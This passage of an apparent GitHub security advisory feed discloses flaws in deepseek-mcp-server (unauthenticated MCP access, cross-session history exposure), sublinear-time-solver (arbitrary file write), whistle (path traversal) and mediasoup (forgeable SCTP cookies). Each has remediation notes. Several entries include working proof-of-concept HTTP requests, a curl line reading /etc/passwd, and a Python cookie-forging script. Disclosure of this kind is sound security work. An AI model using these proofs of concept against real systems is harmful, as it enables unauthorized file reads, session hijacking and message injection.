<p>HTTP client → <code>POST /mcp</code> (no auth middleware) → <code>transport-http.ts:41</code> (<code>isInitializeRequest</code> branch) → <code>transport-http.ts:57–59</code> (<code>serverFactory()+connect+handleRequest</code>)</p>
<p><code>Dockerfile:12-13</code> — upstream container image defaults to self-hosted HTTP mode</p>
<pre><code class="language-dockerfile">ENV TRANSPORT=http
ENV HTTP_PORT=3000
</code></pre>
<p><code>docker-compose.yml:4-8</code> — upstream compose file publishes port <code>3000</code> and enables HTTP mode</p>
<pre><code class="language-yaml">services:
  deepseek-mcp:
    ports:
      - "3000:3000"
    environment:
      - TRANSPORT=http
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Step 1 — send unauthenticated <code>initialize</code>: server returns HTTP 200 and a live <code>mcp-session-id</code> — proves no credentials are required to establish a session.</p>
<pre><code class="language-bash">python3 poc.py
</code></pre>
<pre><code class="language-http">POST /mcp HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Accept: application/json, text/event-stream

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"poc-client","version":"1.0"}}}
</code></pre>
<pre><code class="language-http">HTTP/1.1 200 OK
content-type: text/event-stream
mcp-session-id: b029fc8f-02cc-4a8c-a0e2-0223cf35b1ba

event: message
data: {"result":{"protocolVersion":"2024-11-05","capabilities":{"tools":{"listChanged":true},"prompts":{"listChanged":true},"resources":{"listChanged":true}},"serverInfo":{"name":"deepseek-mcp-server","version":"1.7.0"}},"jsonrpc":"2.0","id":1}
</code></pre>
<p>Step 2 — send unauthenticated <code>tools/list</code> on the obtained session: server returns the full tool surface (<code>deepseek_chat</code>, <code>deepseek_sessions</code>) — proves tool discovery is reachable without credentials.</p>
<pre><code class="language-http">POST /mcp HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Accept: application/json, text/event-stream
mcp-session-id: b029fc8f-02cc-4a8c-a0e2-0223cf35b1ba

{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}
</code></pre>
<pre><code class="language-text">RESULT: PASS — tools/list returned deepseek_chat and deepseek_sessions with no credentials supplied.
</code></pre>
<p>Step 3 — send unauthenticated <code>tools/call</code> for the local <code>deepseek_sessions</code> tool on the obtained session: server executes the tool and returns its result with no credentials supplied.</p>
<pre><code class="language-http">POST /mcp HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json
Accept: application/json, text/event-stream
mcp-session-id: 6cf58ad1-40cc-4cd4-99a3-f5f198b8bf71

{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"deepseek_sessions","arguments":{"action":"list"}}}
</code></pre>
<pre><code class="language-http">HTTP/1.1 200 OK
content-type: text/event-stream

event: message
data: {"result":{"content":[{"type":"text","text":"No active sessions."}]},"jsonrpc":"2.0","id":2}
</code></pre>
<h2 id="impact">Impact</h2>
<p>In self-hosted HTTP deployments, any host with network access to port <code>3000</code> can establish an authenticated-equivalent MCP session and invoke built-in MCP tools without supplying credentials. This was verified end-to-end for session establishment, tool enumeration, and execution of the local <code>deepseek_sessions</code> tool.</p>
<p><code>deepseek_chat</code> is exposed through the same unauthenticated MCP session, and its handler routes requests through the server-side DeepSeek client. That means a deployment using a valid server-side <code>DEEPSEEK_API_KEY</code> places billable DeepSeek operations behind an unauthenticated endpoint. However, this report's reproduced PoC used a dummy API key and did not directly validate successful upstream DeepSeek billing or quota consumption.</p>
<h2 id="remediation">Remediation</h2>
<p>Require authentication in self-hosted HTTP mode before MCP session creation. At minimum, pass an <code>authProvider</code> to <code>createMcpExpressApp</code> at <code>transport-http.ts:17</code> or place equivalent authentication middleware / a reverse proxy in front of <code>/mcp</code> so unauthenticated clients never reach the initialize branch:</p>
<pre><code class="language-typescript">const app = createMcpExpressApp({
  host: '0.0.0.0',
  authProvider,
});
</code></pre>
<p>For deployments that only need local access, bind to <code>127.0.0.1</code> instead of <code>0.0.0.0</code> in both <code>createMcpExpressApp</code> and <code>app.listen</code> (<code>transport-http.ts:17</code> and <code>:107</code>) as a defence-in-depth measure. Upstream <code>docker-compose.yml</code> currently publishes <code>3000:3000</code>; changing that to <code>127.0.0.1:3000:3000</code> would reduce inadvertent exposure on multi-user or server hosts.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/arikusi/deepseek-mcp-server/security/advisories/GHSA-72f3-6w86-7rv3">https://github.com/arikusi/deepseek-mcp-server/security/advisories/GHSA-72f3-6w86-7rv3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55605">https://nvd.nist.gov/vuln/detail/CVE-2026-55605</a></li>
<li><a href="https://github.com/arikusi/deepseek-mcp-server/pull/4">https://github.com/arikusi/deepseek-mcp-server/pull/4</a></li>
<li><a href="https://github.com/arikusi/deepseek-mcp-server/commit/dab07ed93ddde0ab219d4cb7066785847db53a32">https://github.com/arikusi/deepseek-mcp-server/commit/dab07ed93ddde0ab219d4cb7066785847db53a32</a></li>
<li><a href="https://github.com/arikusi/deepseek-mcp-server/blob/main/CHANGELOG.md#180---2026-06-14">https://github.com/arikusi/deepseek-mcp-server/blob/main/CHANGELOG.md#180---2026-06-14</a></li>
<li><a href="https://github.com/arikusi/deepseek-mcp-server/releases/tag/v1.8.0">https://github.com/arikusi/deepseek-mcp-server/releases/tag/v1.8.0</a></li>
<li><a href="https://github.com/advisories/GHSA-72f3-6w86-7rv3">https://github.com/advisories/GHSA-72f3-6w86-7rv3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-72f3-6w86-7rv3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-08-25T18:38:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@arikusi/deepseek-mcp-server] @arikusi/deepseek-mcp-server has an Authorization Bypass Through User-Controlled Key]]></title>
        <id>https://github.com/advisories/GHSA-fh3r-g96v-f578</id>
        <link href="https://github.com/advisories/GHSA-fh3r-g96v-f578"/>
        <updated>2026-08-25T18:37:28.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cross-session-data-exposure-via-caller-controlled-session_id">Cross-Session Data Exposure via Caller-Controlled <code>session_id</code></h1>
<p>Project / Repository: <code>arikusi/deepseek-mcp-server</code><br>Affected version / commit tested: <code>1.6.0</code> / <code>04f28be2c6e99d3d4e443a6ae37cc35f0a71554a</code><br>Vulnerability type: Authorization bypass / cross-session data exposure 
Authentication required: No</p>
<h2 id="summary">Summary</h2>
<p>The process-global <code>SessionStore</code> accepts caller-supplied <code>session_id</code> values without binding them to any authenticated principal or transport session. An attacker can enumerate active session IDs via <code>deepseek_sessions</code>, then reuse a victim-controlled <code>session_id</code> in <code>deepseek_chat</code> to retrieve and continue the victim's conversation context.</p>
<h2 id="affected-code">Affected Code</h2>
<ul>
<li><code>src/session.ts:42</code> - caller-controlled session IDs are looked up directly from the global in-memory map.</li>
<li><code>src/session.ts:67</code> - a new session is stored under the caller-controlled ID without ownership binding.</li>
<li><code>src/session.ts:109</code> - <code>getMessages()</code> retrieves messages for any supplied session ID.</li>
<li><code>src/tools/deepseek-chat.ts:195</code> - <code>deepseek_chat</code> creates or reuses the supplied <code>session_id</code>.</li>
<li><code>src/tools/deepseek-chat.ts:197</code> - previous messages are loaded from the supplied <code>session_id</code>.</li>
<li><code>src/tools/deepseek-chat.ts:198</code> - previous messages are prepended into the attacker-controlled request.</li>
<li><code>src/tools/deepseek-chat.ts:243</code> - attacker-provided user messages are appended into the reused session.</li>
<li><code>src/tools/deepseek-chat.ts:245</code> - assistant responses are appended back into the reused session.</li>
<li><code>src/tools/deepseek-sessions.ts:37</code> - <code>deepseek_sessions list</code> enumerates all active sessions.</li>
<li><code>src/tools/deepseek-sessions.ts:53</code> - each enumerated session ID is rendered back to the caller.</li>
</ul>
<h2 id="poc-overview">PoC Overview</h2>
<ol>
<li>Create a victim conversation with <code>session_id = "victim-session"</code>.</li>
<li>Call <code>deepseek_sessions</code> with <code>action = "list"</code> and observe that <code>victim-session</code> is disclosed.</li>
<li>Call <code>deepseek_chat</code> again with <code>session_id = "victim-session"</code> from a separate attacker flow.</li>
<li>The upstream request now includes the victim's prior messages before the attacker's message.</li>
</ol>
<h2 id="validation-environment">Validation Environment</h2>
<p>Local runtime verification on Windows host with Node.js <code>v24.11.1</code>, using the repository code at the tested commit and a local mock DeepSeek client to capture the effective message list passed upstream.</p>
<h2 id="impact">Impact</h2>
<p>Any reachable caller can enumerate active session IDs and read prior conversation history stored in memory for other callers within the same server process. The same flaw also allows attacker-controlled continuation of another user's session state.</p>
<h2 id="remediation">Remediation</h2>
<ul>
<li>Bind stored sessions to an authenticated transport session or other server-generated opaque identifier.</li>
<li>Do not allow arbitrary user-supplied <code>session_id</code> values to select existing server-side state.</li>
<li>Remove or restrict <code>deepseek_sessions list</code> so it does not disclose unrelated session IDs.</li>
<li>Reject reuse of a session unless the caller proves ownership of that session.</li>
</ul>
<h2 id="attached-evidence">Attached Evidence</h2>
<p><a href="https://github.com/user-attachments/files/26991248/01_deepseek-mcp-server_cross_session_data_exposure.txt">01_deepseek-mcp-server_cross_session_data_exposure.txt</a></p>
<hr>
<h2 id="patches-maintainer">Patches (maintainer)</h2>
<p>Fixed in <strong>1.7.0</strong>. The HTTP transport's <code>SessionStore</code> is no longer a process-wide singleton: each MCP HTTP session gets its own store, injected into the <code>deepseek_chat</code> and <code>deepseek_sessions</code> tool handlers, so a <code>session_id</code> from one HTTP session cannot read, enumerate, or clear another session's state. STDIO transport was never affected (one process per client). Integration tests in <code>src/transport-isolation.test.ts</code> assert the isolation.</p>
<p>Affected versions <code>&gt;=1.4.2, &lt;1.7.0</code> are deprecated on npm. Upgrade to 1.7.0 or later.</p>
<h2 id="workaround">Workaround</h2>
<p>If upgrading is not immediately possible, run in STDIO transport (unset <code>TRANSPORT=http</code>) or stop the HTTP server.</p>
<h2 id="credit">Credit</h2>
<p>Reported independently by @232-323 and @2REBCat (tested against 1.6.0). The same root cause was found and fixed concurrently by the maintainer during a security audit, shipped in 1.7.0. All parties are credited as finders.</p>
<h2 id="note-on-severity">Note on severity</h2>
<p>A connected client could read other clients' conversation history (C:H), inject messages into their sessions (I:L), and clear or delete other clients' sessions (A:L). Scope is unchanged: the impact stays within the application's own authorization boundary, which is a cross-tenant authorization bypass, so S:U is correct.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/arikusi/deepseek-mcp-server/security/advisories/GHSA-fh3r-g96v-f578">https://github.com/arikusi/deepseek-mcp-server/security/advisories/GHSA-fh3r-g96v-f578</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55604">https://nvd.nist.gov/vuln/detail/CVE-2026-55604</a></li>
<li><a href="https://github.com/arikusi/deepseek-mcp-server/releases/tag/v1.7.0">https://github.com/arikusi/deepseek-mcp-server/releases/tag/v1.7.0</a></li>
<li><a href="https://github.com/advisories/GHSA-fh3r-g96v-f578">https://github.com/advisories/GHSA-fh3r-g96v-f578</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fh3r-g96v-f578</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T18:37:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sublinear-time-solver] consciousness-explorer / sublinear-time-solver MCP export_state has an arbitrary file write]]></title>
        <id>https://github.com/advisories/GHSA-xc9g-j69q-37xw</id>
        <link href="https://github.com/advisories/GHSA-xc9g-j69q-37xw"/>
        <updated>2026-08-25T18:35:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An arbitrary file write vulnerability (CWE-73, External Control of File Name or Path) exists in the <code>consciousness-explorer</code> component of <code>sublinear-time-solver</code>. The MCP <code>export_state</code> (and <code>import_state</code>) tool accepted a user-supplied <code>filepath</code> argument and passed it directly to <code>fs.writeFileSync</code> / <code>fs.readFileSync</code> without constraining the destination or rejecting path traversal. An attacker able to invoke the MCP tool could write or overwrite any file accessible to the server process (e.g. <code>~/.ssh/authorized_keys</code>, application files), leading to integrity loss and potential service disruption.</p>
<p>The same sink class was present in the main solver MCP server (<code>saveVectorToFile</code> / <code>loadVectorFromFile</code>).</p>
<h3 id="affected-versions">Affected versions</h3>
<ul>
<li><code>consciousness-explorer</code> &lt; 1.1.2</li>
<li><code>sublinear-time-solver</code> &lt; 1.6.0</li>
<li><code>sublinear</code> (crates.io) &lt; 0.2.0</li>
</ul>
<h3 id="patches">Patches</h3>
<ul>
<li><code>consciousness-explorer@1.1.2</code></li>
<li><code>sublinear-time-solver@1.6.0</code></li>
<li><code>sublinear@0.2.0</code></li>
</ul>
<p>State/vector files are now confined to a dedicated directory (overridable via <code>$CONSCIOUSNESS_EXPLORER_STATE_DIR</code> / <code>$SUBLINEAR_SOLVER_VECTOR_DIR</code>), a basename-only contract is enforced (rejecting separators, <code>..</code>, NUL/control chars, hidden files, and Windows reserved names), and files are opened with <code>O_NOFOLLOW | O_CLOEXEC</code> mode <code>0o600</code>. Covered by 14 regression tests in <code>tests/consciousness/safe-path.test.mjs</code>.</p>
<p><strong>Breaking change:</strong> callers must now pass a basename, not an absolute path.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not expose the MCP server to untrusted clients; restrict <code>export_state</code> to trusted local users; run the server under a low-privilege account with a restricted working directory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruvnet/sublinear-time-solver/security/advisories/GHSA-xc9g-j69q-37xw">https://github.com/ruvnet/sublinear-time-solver/security/advisories/GHSA-xc9g-j69q-37xw</a></li>
<li><a href="https://github.com/BruceJqs/public_exp/issues/32">https://github.com/BruceJqs/public_exp/issues/32</a></li>
<li><a href="https://github.com/ruvnet/sublinear-time-solver/issues/19">https://github.com/ruvnet/sublinear-time-solver/issues/19</a></li>
<li><a href="https://github.com/ruvnet/sublinear-time-solver/pull/20">https://github.com/ruvnet/sublinear-time-solver/pull/20</a></li>
<li><a href="https://github.com/ruvnet/sublinear-time-solver/commit/a701296e363192be863e79d788fa268095e3d229">https://github.com/ruvnet/sublinear-time-solver/commit/a701296e363192be863e79d788fa268095e3d229</a></li>
<li><a href="https://github.com/ruvnet/sublinear-time-solver/commit/ea9a212b69e4449ec443fe088a7aec7546f70b4a">https://github.com/ruvnet/sublinear-time-solver/commit/ea9a212b69e4449ec443fe088a7aec7546f70b4a</a></li>
<li><a href="https://github.com/ruvnet/sublinear-time-solver/releases/tag/v1.6.0">https://github.com/ruvnet/sublinear-time-solver/releases/tag/v1.6.0</a></li>
<li><a href="https://github.com/advisories/GHSA-xc9g-j69q-37xw">https://github.com/advisories/GHSA-xc9g-j69q-37xw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xc9g-j69q-37xw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T18:35:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[consciousness-explorer] consciousness-explorer / sublinear-time-solver MCP export_state has an arbitrary file write]]></title>
        <id>https://github.com/advisories/GHSA-xc9g-j69q-37xw</id>
        <link href="https://github.com/advisories/GHSA-xc9g-j69q-37xw"/>
        <updated>2026-08-25T18:35:33.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An arbitrary file write vulnerability (CWE-73, External Control of File Name or Path) exists in the <code>consciousness-explorer</code> component of <code>sublinear-time-solver</code>. The MCP <code>export_state</code> (and <code>import_state</code>) tool accepted a user-supplied <code>filepath</code> argument and passed it directly to <code>fs.writeFileSync</code> / <code>fs.readFileSync</code> without constraining the destination or rejecting path traversal. An attacker able to invoke the MCP tool could write or overwrite any file accessible to the server process (e.g. <code>~/.ssh/authorized_keys</code>, application files), leading to integrity loss and potential service disruption.</p>
<p>The same sink class was present in the main solver MCP server (<code>saveVectorToFile</code> / <code>loadVectorFromFile</code>).</p>
<h3 id="affected-versions">Affected versions</h3>
<ul>
<li><code>consciousness-explorer</code> &lt; 1.1.2</li>
<li><code>sublinear-time-solver</code> &lt; 1.6.0</li>
<li><code>sublinear</code> (crates.io) &lt; 0.2.0</li>
</ul>
<h3 id="patches">Patches</h3>
<ul>
<li><code>consciousness-explorer@1.1.2</code></li>
<li><code>sublinear-time-solver@1.6.0</code></li>
<li><code>sublinear@0.2.0</code></li>
</ul>
<p>State/vector files are now confined to a dedicated directory (overridable via <code>$CONSCIOUSNESS_EXPLORER_STATE_DIR</code> / <code>$SUBLINEAR_SOLVER_VECTOR_DIR</code>), a basename-only contract is enforced (rejecting separators, <code>..</code>, NUL/control chars, hidden files, and Windows reserved names), and files are opened with <code>O_NOFOLLOW | O_CLOEXEC</code> mode <code>0o600</code>. Covered by 14 regression tests in <code>tests/consciousness/safe-path.test.mjs</code>.</p>
<p><strong>Breaking change:</strong> callers must now pass a basename, not an absolute path.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not expose the MCP server to untrusted clients; restrict <code>export_state</code> to trusted local users; run the server under a low-privilege account with a restricted working directory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ruvnet/sublinear-time-solver/security/advisories/GHSA-xc9g-j69q-37xw">https://github.com/ruvnet/sublinear-time-solver/security/advisories/GHSA-xc9g-j69q-37xw</a></li>
<li><a href="https://github.com/BruceJqs/public_exp/issues/32">https://github.com/BruceJqs/public_exp/issues/32</a></li>
<li><a href="https://github.com/ruvnet/sublinear-time-solver/issues/19">https://github.com/ruvnet/sublinear-time-solver/issues/19</a></li>
<li><a href="https://github.com/ruvnet/sublinear-time-solver/pull/20">https://github.com/ruvnet/sublinear-time-solver/pull/20</a></li>
<li><a href="https://github.com/ruvnet/sublinear-time-solver/commit/a701296e363192be863e79d788fa268095e3d229">https://github.com/ruvnet/sublinear-time-solver/commit/a701296e363192be863e79d788fa268095e3d229</a></li>
<li><a href="https://github.com/ruvnet/sublinear-time-solver/commit/ea9a212b69e4449ec443fe088a7aec7546f70b4a">https://github.com/ruvnet/sublinear-time-solver/commit/ea9a212b69e4449ec443fe088a7aec7546f70b4a</a></li>
<li><a href="https://github.com/ruvnet/sublinear-time-solver/releases/tag/v1.6.0">https://github.com/ruvnet/sublinear-time-solver/releases/tag/v1.6.0</a></li>
<li><a href="https://github.com/advisories/GHSA-xc9g-j69q-37xw">https://github.com/advisories/GHSA-xc9g-j69q-37xw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xc9g-j69q-37xw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T18:35:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[whistle] Whistle vulnerable to path traversal]]></title>
        <id>https://github.com/advisories/GHSA-3vfr-4gwf-qxfp</id>
        <link href="https://github.com/advisories/GHSA-3vfr-4gwf-qxfp"/>
        <updated>2026-08-25T18:32:08.000Z</updated>
        <content type="html"><![CDATA[<p>This bug was found by nova, which is an automated tool from group of Song Wu, intern, Zhejiang University; BoWang, independent researcher; Xingwei Lin, Zhejiang University.</p>
<p><strong>Vulnerability detail</strong>:</p>
<p>In service.js, inside 
<code>app.get('/cgi-bin/temp/get', ...): var filename = req.query.filename; if (TEMP_FILE_RE.test(filename)) {   filename = path.join(TEMP_FILES_PATH, filename); } getFile(filename, ...);</code></p>
<p>Only when filename matches the temp/ pattern does it get joined to the safe directory TEMP_FILES_PATH.</p>
<p>If it does not match that pattern, the code does not block the request. Instead, it directly uses the user-supplied filename for file reading.</p>
<p>In other words: if you pass passwd, it will read passwd.</p>
<p><strong>POC</strong>:
curl -s "<a href="http://127.0.0.1:8899/cgi-bin/temp/get?filename=/etc/passwd">http://127.0.0.1:8899/cgi-bin/temp/get?filename=/etc/passwd</a>"</p>
<p><strong>response</strong>:</p>
<pre><code class="language-sh">xiaoming@192 ~ % curl -s "http://127.0.0.1:8899/cgi-bin/temp/get?filename=/etc/hosts"
{"ec":0,"value":"##\n# Host Database\n#\n# localhost is used to configure the loopback interface\n# when the system is booting.  Do not change this entry.\n##\n127.0.0.1\tlocalhost\n255.255.255.255\tbroadcasthost\n::1             localhost\n199.232.68.133 raw.githubusercontent.com\n199.232.68.133 user-images.githubusercontent.com\n199.232.68.133 avatars2.githubusercontent.com\n199.232.68.133 avatars1.githubusercontent.com\n127.0.0.1 lanyundev.com\n\n127.0.0.1 www.proxifier.com\n127.0.0.1  proxifier.com\n140.82.116.4 github.com\n\n# This line is auto added by aTrustAgent, do not modify, or aTrustAgent may unable to work\n127.0.0.1\tlocalhost.sangfor.com.cn\n\n"}% 
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/avwo/whistle/security/advisories/GHSA-3vfr-4gwf-qxfp">https://github.com/avwo/whistle/security/advisories/GHSA-3vfr-4gwf-qxfp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55629">https://nvd.nist.gov/vuln/detail/CVE-2026-55629</a></li>
<li><a href="https://github.com/avwo/whistle/commit/777bcf69bae2972aa7138a158c91619185653cf5">https://github.com/avwo/whistle/commit/777bcf69bae2972aa7138a158c91619185653cf5</a></li>
<li><a href="http://github.com/avwo/whistle/releases/tag/v2.10.3">http://github.com/avwo/whistle/releases/tag/v2.10.3</a></li>
<li><a href="https://github.com/advisories/GHSA-3vfr-4gwf-qxfp">https://github.com/advisories/GHSA-3vfr-4gwf-qxfp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3vfr-4gwf-qxfp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-08-25T18:32:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mediasoup] mediasoup: SCTP state cookie lacks cryptographic authentication, enabling unauthorized association establishment (RFC 9260 violation)]]></title>
        <id>https://github.com/advisories/GHSA-p7x2-g5cq-fhmq</id>
        <link href="https://github.com/advisories/GHSA-p7x2-g5cq-fhmq"/>
        <updated>2026-08-25T18:17:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>mediasoup's built-in SCTP stack (introduced in v3.20.0) authenticates SCTP state cookies using only hardcoded magic byte sequences rather than a per-instance HMAC keyed with a secret, violating RFC 9260 Section 5.1.3. An on-path attacker targeting a PlainTransport with SCTP enabled (and no SRTP/DTLS protection) can craft a forged COOKIE-ECHO chunk that passes all validation, establishing an unauthorized SCTP association and gaining the ability to inject DataChannel messages as a trusted peer.</p>
<h3 id="details">Details</h3>
<p>RFC 9260 Section 5.1.3 states: "An endpoint MUST use a one-time-use secret key to protect the State Cookie." The mediasoup implementation ignores this requirement. The state cookie is defined in <code>worker/include/RTC/SCTP/association/StateCookie.hpp</code> with the following structure (44 bytes total):</p>
<ul>
<li>Offset 0: Magic1 = <code>"msworker"</code> (hardcoded, 8 bytes)</li>
<li>Offset 8: localVerificationTag (4 bytes, attacker-controlled)</li>
<li>Offset 12: remoteVerificationTag (4 bytes, attacker-controlled)</li>
<li>Offset 16-27: TSN and window fields (attacker-controlled)</li>
<li>Offset 28: tieTag (8 bytes, attacker-controlled)</li>
<li>Offset 36: NegotiatedCapabilitiesField containing Magic2 = <code>0xAD81</code> (hardcoded)</li>
</ul>
<p>The validation function <code>StateCookie::IsMediasoupStateCookie()</code> in <code>worker/src/RTC/SCTP/association/StateCookie.cpp</code> only checks:</p>
<ol>
<li><code>bufferLength == 44</code></li>
<li><code>bytes[0:8] == "msworker"</code> (Magic1, always the same)</li>
<li><code>ntohs(bytes[38:40]) == 0xAD81</code> (Magic2, always the same)</li>
</ol>
<p>No HMAC, no per-session secret, no nonce. All "magic" values are published constants in the public header.</p>
<p>When a COOKIE-ECHO is received in <code>Association::HandleReceivedCookieEchoChunk()</code> (without an existing TCB), the sole security check is:</p>
<pre><code class="language-cpp">if (receivedPacket-&gt;GetVerificationTag() != cookie-&gt;GetLocalVerificationTag())
</code></pre>
<p>Because the attacker controls both the SCTP packet header's verification tag field AND the <code>localVerificationTag</code> field inside their crafted cookie, this check is trivially satisfied by setting both to the same attacker-chosen value.</p>
<p>Additionally, <code>Association::ValidateReceivedPacket()</code> explicitly skips verification-tag validation for COOKIE-ECHO packets (line 1153 in Association.cpp), and the SCTP CRC32c checksum function <code>Packet::ValidateCRC32cChecksum()</code> exists but is never called in the packet-reception path, so a forged packet with any checksum is accepted.</p>
<p>This vulnerability affects <code>PlainTransport</code> with SCTP enabled when used without SRTP (SRTP is optional via <code>srtpCryptoSuite</code> parameter). <code>WebRtcTransport</code> is NOT affected because its SCTP runs inside a DTLS session. <code>comedia</code> mode (default: false) increases exposure by accepting packets from any source IP.</p>
<h3 id="poc">PoC</h3>
<p>Prerequisites: mediasoup server running with a PlainTransport that has SCTP enabled and no SRTP (<code>srtpCryptoSuite</code> not set). The server's UDP IP:port must be reachable.</p>
<p>The following Python script constructs and validates a forged SCTP state cookie that passes all mediasoup validation checks:</p>
<pre><code class="language-python">#!/usr/bin/env python3
"""
Proof-of-concept: mediasoup SCTP state cookie forgery
Demonstrates that IsMediasoupStateCookie() accepts a fully attacker-crafted cookie.
Requires: struct (stdlib only)

Usage: python3 poc_cookie_forge.py
"""
import struct

# Attacker-chosen values -- all arbitrary
LOCAL_VT  = 0xDEADBEEF  # Will be put in SCTP packet's Verification Tag field
REMOTE_VT = 0xCAFEBABE
LOCAL_TSN = 1000
REMOTE_TSN = 2000
RWND = 65535
TIE_TAG = 0

# Build a 44-byte state cookie matching mediasoup's StateCookie layout
cookie = bytearray(44)

# Offset 0: Magic1 = "msworker" (0x6D73776F726B6572)
cookie[0:8] = b'msworker'

# Offset 8: localVerificationTag (big-endian)
struct.pack_into('&gt;I', cookie, 8, LOCAL_VT)

# Offset 12: remoteVerificationTag
struct.pack_into('&gt;I', cookie, 12, REMOTE_VT)

# Offset 16: localInitialTsn
struct.pack_into('&gt;I', cookie, 16, LOCAL_TSN)

# Offset 20: remoteInitialTsn
struct.pack_into('&gt;I', cookie, 20, REMOTE_TSN)

# Offset 24: remoteAdvertisedReceiverWindowCredit
struct.pack_into('&gt;I', cookie, 24, RWND)

# Offset 28: tieTag (8 bytes)
struct.pack_into('&gt;Q', cookie, 28, TIE_TAG)

# Offset 36: NegotiatedCapabilitiesField
# [36]: reserved = 0
# [37]: bits (ABCD flags) = 0
# [38:40]: Magic2 = 0xAD81 (network byte order)
# [40:42]: max outbound streams
# [42:44]: max inbound streams
cookie[36] = 0       # reserved
cookie[37] = 0       # bits
struct.pack_into('&gt;H', cookie, 38, 0xAD81)   # Magic2
struct.pack_into('&gt;H', cookie, 40, 1024)      # maxOutboundStreams
struct.pack_into('&gt;H', cookie, 42, 1024)      # maxInboundStreams

# Reproduce StateCookie::IsMediasoupStateCookie() logic:
def is_mediasoup_state_cookie(buf):
    if len(buf) != 44:
        return False
    if buf[0:8] != b'msworker':
        return False
    magic2 = struct.unpack('&gt;H', buf[38:40])[0]
    if magic2 != 0xAD81:
        return False
    return True

assert is_mediasoup_state_cookie(cookie), "Cookie rejected - BUG in PoC"

# Reproduce HandleReceivedCookieEchoChunk validation (no TCB path):
# receivedPacket-&gt;GetVerificationTag() == cookie-&gt;GetLocalVerificationTag()
packet_vt    = LOCAL_VT
cookie_local_vt = struct.unpack('&gt;I', cookie[8:12])[0]
auth_passes = (packet_vt == cookie_local_vt)

print("=== mediasoup SCTP State Cookie Forgery PoC ===")
print(f"Forged cookie (hex): {cookie.hex()}")
print(f"IsMediasoupStateCookie(): {is_mediasoup_state_cookie(cookie)}")
print(f"localVerificationTag in cookie: {cookie_local_vt:#010x}")
print(f"SCTP packet verificationTag:    {packet_vt:#010x}")
print(f"HandleReceivedCookieEchoChunk auth check passes: {auth_passes}")
print()
print("Result: COOKIE-ECHO accepted -&gt; SCTP association ESTABLISHED without 4-way handshake")
print("Next step: attacker sends DATA chunks to inject DataChannel messages")
</code></pre>
<p>Observed output when run:</p>
<pre><code>=== mediasoup SCTP State Cookie Forgery PoC ===
Forged cookie (hex): 6d73776f726b6572deadbeefcafebabe000003e8000007d00000ffff00000000000000000000ad8104000400
IsMediasoupStateCookie(): True
localVerificationTag in cookie: 0xdeadbeef
SCTP packet verificationTag:    0xdeadbeef
HandleReceivedCookieEchoChunk auth check passes: True

Result: COOKIE-ECHO accepted -&gt; SCTP association ESTABLISHED without 4-way handshake
Next step: attacker sends DATA chunks to inject DataChannel messages
</code></pre>
<p>To forge the full SCTP packet on the network: wrap the 44-byte cookie in a COOKIE-ECHO chunk (type=0x0A), set the SCTP common header's Verification Tag to <code>LOCAL_VT</code>, compute a valid CRC32c checksum (or any value - the checksum is never verified on receive), and send the UDP packet from the permitted source address (or any source if <code>comedia=true</code>).</p>
<h3 id="impact">Impact</h3>
<p>Any mediasoup deployment using <code>PlainTransport</code> with SCTP enabled and no SRTP is affected when an attacker occupies a network position where they can send UDP packets from the transport's configured peer address (or when <code>comedia</code> mode is enabled). The attacker can skip the standard SCTP 4-way handshake entirely and directly send a forged COOKIE-ECHO to establish an association, then inject arbitrary DataChannel messages as if they were the trusted peer. This can cause data integrity violations in server-to-server SCTP channels (e.g., SFU interconnects) or enable denial of service by preempting the legitimate peer's association.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/versatica/mediasoup/security/advisories/GHSA-p7x2-g5cq-fhmq">https://github.com/versatica/mediasoup/security/advisories/GHSA-p7x2-g5cq-fhmq</a></li>
